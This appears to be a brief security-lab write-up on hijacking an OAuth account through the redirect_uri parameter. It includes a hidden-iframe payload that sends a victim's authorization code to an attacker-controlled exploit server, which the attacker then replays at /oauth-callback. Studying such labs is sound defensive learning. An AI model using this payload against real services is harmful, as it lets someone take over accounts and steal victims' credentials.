# OAuth account hijacking via redirect_uri

We set our server as the value of the redirect_uri parameter.

![Screenshot1](/04-Screenshots/1-OAuth-account-hijacking-via-redirect_uri.png)

In the logs of our server we obtained, as a PoC:

![Screenshot2](/04-Screenshots/2-OAuth-account-hijacking-via-redirect_uri.png)

With the same logic créate a script that we will send to the victim


```js
<iframe src="https://<OAUTH-IP>/auth?client_id=<YOUR-CLIENT-ID>&redirect_uri=<EXPLOIT-SV>&response_type=code&scope=openid%20profile%20email"hidden="hidden"></iframe>
```

We obtain the victim's code and submit it to /oauth-callback.

![Screenshot3](/04-Screenshots/3-OAuth-account-hijacking-via-redirect_uri.png)

![Screenshot4](/04-Screenshots/4-OAuth-account-hijacking-via-redirect_uri.png)

